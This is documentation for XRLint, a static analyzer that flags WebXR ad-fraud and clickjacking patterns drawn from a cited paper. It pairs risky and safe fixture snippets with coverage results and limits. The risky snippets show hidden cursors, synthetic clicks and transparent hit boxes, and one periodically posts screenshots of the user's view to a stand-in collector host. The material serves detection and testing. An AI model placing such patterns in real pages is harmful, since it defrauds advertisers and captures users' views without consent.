# Threat model and vulnerabilities covered

This document says which attacks and vulnerabilities from *Shadowed Realities* (Mukherjee et
al., USENIX Security 2025) XRLint can point at, and which it cannot. Section numbers refer to
that paper. Every "risky" and "safe" snippet below is taken from, or mirrors, a test page in
`tests/fixtures/` and is checked by the test suite, unless marked otherwise.

## 1. Threat model

**Setting (paper §3).** A WebXR page has three ad-ecosystem parties: the publisher (who owns
the page), the ad service provider, and the advertiser. Unlike 2D web ads, WebXR has no
iframe-like isolation. Third-party code runs in the same page and the same 3D scene as the
publisher's code. The paper assumes **any** of the three can be malicious, and the user is the
victim.

**Adversary goals (paper §5.3):**
- click fraud;
- impression fraud;
- disrupting a competitor's content;
- stealing user input or data.

**Who runs XRLint, and what it assumes.**

- **Users:** a reviewer with access to the page's source and the third-party code that will
  run in it. That could be a developer integrating an ad SDK, an ad network or store reviewing
  a creative or SDK, or a researcher measuring a corpus.
- **Coverage assumption:** XRLint only sees code that is present as files. If the malicious
  code is fetched from a remote server at runtime, XRLint only reports that a remote script
  exists (`P1`, info).
- **Out of scope:** attacks that need a compromised browser, OS or headset; network attacks;
  multi-user XR. The paper also leaves multi-user settings and hand-tracking to future work
  (§8).

**What a finding means.** A finding says that a security-sensitive UI property from the
paper's Table 1 is used at this file and line. It is not a verdict about intent. The paper
itself says every property has legitimate uses (§5.2).

## 2. Attacks and vulnerabilities XRLint can point at

Severities: **high** = closely matches a paper attack; **medium** = risky property clearly present;
**low** = property present but very common in normal code. Page-level "flag" = any medium/high.

### 2.1 Transparent objects that still take clicks — `P2-transparent-interactive` (property P2)

**Attacks (paper §5.3, §5.4.1):** Intercepting User Inputs, DoS through invisibility,
Malvertising. An object with opacity 0 can still be hit by the ray, so it silently receives
clicks meant for whatever the user sees behind it.

**Risky** (`unit/p2_transparent_hitbox_risky.html`) → high:
```html
<a-entity cursor raycaster="objects: .clickable"></a-entity>
<a-box   class="clickable" id="play" position="0 1.5 -3"></a-box>
<a-plane class="clickable" buy-button position="0 1.5 -2" width="1.5" height="1.5"
         material="opacity: 0; transparent: true"></a-plane>
```
**Safe** (`unit/p2_transparent_hitbox_safe.html`): the same button is visible
(`color="#EF2D5E"`, no opacity 0) and does not cover anything.

### 2.2 Objects made invisible by script — `P2-js-transparency` (P2)

**Attacks (§5.3):** GCJ hides the real cursor, CCJ hides an injected controller, and DoS
through overriding hides injected controllers.

High when the hidden element is a cursor or controller; low otherwise.

**Risky** (`attacks/js/gcj-sdk.js`) → high:
```js
realCursor.setAttribute('material', 'opacity: 0; transparent: true');
```
**Safe / low:** hiding a finished UI panel, e.g. `panel.setAttribute('visible', false);`
(reported as low only).

### 2.3 Synthetic input — `P3-synthetic-input` (P3)

**Attacks (§5.3, §5.4.4, §5.4.5):** Input Forgery, Visual Overlapping, Sequential Rendering,
Intercepting User Inputs. Script-fired clicks look like real clicks to listeners that only
check the event name.

**Risky** (`unit/p3_synthetic_click_risky.html`) → high:
```js
setInterval(function () { document.querySelector('#sponsor').emit('click'); }, 10000);
```
**Safe** (`unit/p3_synthetic_click_safe.html`): an app-specific event, not an input event:
```js
document.querySelector('#crate').emit('crate-opened', {coins: 3});
```

### 2.4 Same-space objects (clickjacking) — `P4-same-space-overlap` (P4, and P11)

**Attacks (§5.3):** Clickjacking via rendering vs interaction order, Object Erasure, DoS
through invisibility, Intercepting Inputs. Two objects with the same position and size: the
user sees one, while the other receives the click.

**Risky** (`unit/p4_same_space_risky.html`) → high:
```html
<a-box class="clickable" id="hidden-ad" position="0 1.4 -3"></a-box>
<a-box id="treasure" position="0 1.4 -3" color="gold"></a-box>
```
**Safe** (`unit/p4_same_space_safe.html`): the boxes are at `-1 1.4 -3` and `1 1.4 -3`.

### 2.5 Click handlers that trust any click — `P5-unvalidated-click` (P5)

**Attacks (§5.3):** GCJ, CCJ, Input Forgery, Intercepting Inputs. The paper's guideline (§8)
is to validate the input source. This is low severity because almost every app does it.

**Risky** (`unit/p5_unvalidated_click_risky.html`) → low:
```js
target.addEventListener('click', function () { score += 1; });
```
**Safe** (`unit/p5_unvalidated_click_safe.html`):
```js
target.addEventListener('click', function (evt) {
  if (evt.detail.cursorEl !== sceneEl || !evt.detail.intersection) { return; }
  score += 1;
});
```

### 2.6 Injected cursors and controllers — `P6-dynamic-cursor` (P6)

**Attack (§5.3):** CCJ. A programmatically added controller shares the physical controller's
events. It is high if the same element is also hidden; plain runtime controller setup is low.

**Risky** (`unit/p6_dynamic_cursor_risky.html`) → high:
```js
var fakeCursor = document.createElement('a-entity');
fakeCursor.setAttribute('cursor', 'fuse: false');
fakeCursor.setAttribute('raycaster', 'objects: .ad');
fakeCursor.setAttribute('visible', false);
```
**Safe** (`unit/p6_dynamic_cursor_safe.html`): the controller is declared visibly in markup:
`<a-entity laser-controls="hand: right" raycaster="objects: .menu"></a-entity>`.

### 2.7 Blind spot — `P7-blind-spot` (P7)

**Attacks (§5.3):** BST, CCJ, Input Forgery. Interactive or ad-like content behind the user
collects impressions or clicks the user never sees. The markup check covers the initial view;
the script check covers code that repositions content using the camera orientation.

**Risky** (`unit/p7_blind_spot_risky.html`) → medium (ad-like):
```html
<a-image class="clickable" id="ad-banner" position="0 1.6 4" width="2" height="1"></a-image>
```
**Risky, script** (`attacks/js/bst-sdk.js`) → medium:
```js
var yaw = cam.object3D.rotation.y;
adBanner.object3D.position.set(Math.sin(yaw) * 3, 1.6, Math.cos(yaw) * 3);
```
**Safe** (`unit/p7_blind_spot_safe.html`): the same banner at `2.5 1.6 -4`, in front of the user.

### 2.8 Hidden activity on the 2D auxiliary screen — `P8-aux-screen-activity` (P8, with P9)

**Attacks (§5.3, §5.4.1):** AAD, Malvertising. GUI Switch's page swap on exit (§5.4.2) also
matches, though the paper lists P1, P9 and P13 for it. While the user is immersed, the 2D page
keeps running unseen. This is high when `window.open`, navigation, or an
injected iframe/video happens inside an `enter-vr`/`exit-vr` handler or after an in-VR check;
it is low elsewhere.

**Risky** (`unit/p8_aux_screen_risky.html`) → high:
```js
sceneEl.addEventListener('enter-vr', function () {
  window.open('https://ads.example.com/landing?src=xr', '_blank');
});
```
**Safe** (`unit/p8_aux_screen_safe.html`): the `enter-vr` handler only hides a 2D hint
(`style.display = 'none'`).

`P9-mode-listener` (info) lists every `enter-vr`/`exit-vr` listener as context.

### 2.9 Render-order tricks — `P10-render-order` (P10)

**Attacks (§5.3, §5.4.5):** Clickjacking, Sequential Rendering. This is low, and it only
catches **explicit** manipulation (`depthTest: false`, `renderOrder`).

**Risky** (`unit/p10_render_order_risky.html`): `material="depthTest: false; color: #222"`.
**Safe** (`unit/p10_render_order_safe.html`): `material="color: #222"`.

### 2.10 Bait in front of an interactive object — `P12-occluded-interactive` (P12)

**Attack (§5.4.4):** Visual Overlapping. The ray ignores non-interactive objects, so a click
aimed at the visible bait passes through to the hidden ad behind it.

**Risky** (`unit/p12_occluded_risky.html`) → medium:
```html
<a-entity cursor raycaster="objects: .clickable"></a-entity>
<a-plane id="door" position="0 1.5 -3" width="2" height="2" color="#8B5A2B"></a-plane>
<a-box class="clickable" id="promo" position="0 1.5 -4"></a-box>
```
**Safe** (`unit/p12_occluded_safe.html`): the door is itself `class="clickable"`, so the ray
stops at it.

### 2.11 Scene capture — `P13-scene-capture` (P13)

**Attack (§5.4.2):** GUI Switch. Programmatic screenshots expose the user's view. This is
high if the capture runs on a timer or near a network send, and medium otherwise.

**Risky** (`unit/p13_capture_risky.html`) → high:
```js
setInterval(function () {
  var canvas = sceneEl.components.screenshot.getCanvas('perspective');
  fetch('https://collector.example.com/frame', {method: 'POST', body: canvas.toDataURL()});
}, 5000);
```
**Safe** (`unit/p13_capture_safe.html`): no canvas read-back.

### 2.12 Gaze overridden by controllers — `P14-gaze-override` (P14)

**Attack (§5.4.3):** DoS through overriding. Controller raycasting takes priority over gaze
fusing, so hidden controllers can suppress gaze feedback such as warnings. This is high if the
controller rays are hidden or added at runtime, and medium otherwise.

**Risky** (`unit/p14_gaze_override_risky.html`) → high:
```html
<a-entity cursor="fuse: true; fuseTimeout: 1000" raycaster="objects: .clickable"></a-entity>
<a-entity laser-controls="hand: right" raycaster="objects: .clickable; showLine: false"></a-entity>
```
**Safe** (`unit/p14_gaze_override_safe.html`): gaze cursor only.

### 2.13 Third-party scripts — `P1-third-party-script` (P1, info)

There is no iframe isolation in WebXR (P1). XRLint can only list remote scripts, e.g.
`<script src="https://ads.example.com/sdk.js">`. P1 is a fact about the platform, so it is
never "safe" or "risky" per page.

## 3. Per-attack coverage on our re-implementations

These are results on attack pages **I wrote** from the paper's descriptions
(`tests/fixtures/attacks/`). They show what the rules can see, not real-world recall. Full
table: `eval/results/fixtures.md`.

| Attack (paper) | Flagged | Properties found / missed (P1 not scored) |
|---|---|---|
| GCJ | yes | found P2, P5 |
| CCJ | yes | found P2, P5, P6, P7 |
| Clickjacking | yes | found P4, P11; **missed P10** |
| Visual Overlapping | yes | found P3, P12 |
| Sequential Rendering | yes | found P3, P4; **missed P2, P10, P12** |
| BST | yes (after a fix) | found P7 |
| AAD | yes | found P8, P9 |
| Input Forgery | yes | found P3, P5; **missed P7** |
| Malvertising | yes | found P2, P8, P9; **missed P12** |
| DoS (invisibility) | **no** | found P2 (low only); **missed P4, P12** |
| DoS through overriding | yes | found P2, P14 |
| Object Erasure | **no** | **missed P2, P4** |
| Intercepting User Inputs | yes | found P2, P3, P5; **missed P4, P12** |
| GUI Switch | yes | found P9, P13 |

## 4. What XRLint cannot detect, and why

| Not detected | Why |
|---|---|
| **DoS via invisibility, Object Erasure** (as implemented in our fixtures) | The covering object is created by `createElement` at runtime, so it never exists in the markup that the geometry rules read. |
| **Overlap/occlusion created by scripts** (missed P4/P12 in Intercepting Inputs, Sequential Rendering, Malvertising) | Same reason: the geometry rules run only on markup. |
| **Clickjacking by normal rendering order (P10, P11)** | It uses A-Frame's default behaviour (later entities draw on top), with no code to point at. XRLint can only flag the same-space overlap (P4). |
| **Blind-spot placement decided at runtime without the camera pattern** (Input Forgery P7) | The script computes "behind the user" with vector maths and never moves the ad, so neither the markup nor the "move relative to camera" pattern applies. |
| **Third-party code loaded from a remote URL** | XRLint does not fetch remote code. In the real ad ecosystem this is the common case, and only an info-level `P1` remains. |
| **Transparency via shaders, textures with alpha, or `three.js` objects** | Opacity is read from A-Frame attributes and a few script patterns only. |
| **Obfuscated or minified code** | Patterns rely on readable names (`emit('click')`, `window.open`, variables named like "cursor" or "ad"). `*.min.js` files are skipped on purpose. |
| **Intent** | Every property has legitimate uses, so a static rule cannot tell a hit box from a trap. |
| **Multi-user and hand-tracking dark patterns** | Out of scope here, and also listed as future work by the paper (§8). |
